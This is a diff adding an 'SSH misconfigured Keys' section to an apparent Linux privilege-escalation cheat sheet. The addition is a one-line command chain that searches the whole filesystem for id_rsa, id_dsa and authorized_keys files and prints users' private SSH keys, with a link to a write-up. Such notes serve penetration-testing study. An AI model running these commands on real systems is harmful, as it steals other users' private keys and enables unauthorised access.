@@ -242,4 +242,12 @@ int main()
   - Just compile it and run it from the target system.
 
 
+## SSH misconfigured Keys
+
+```
+ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
+```
+  - [ssh misconfigured](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/)
+
+
 Thanks for reading.
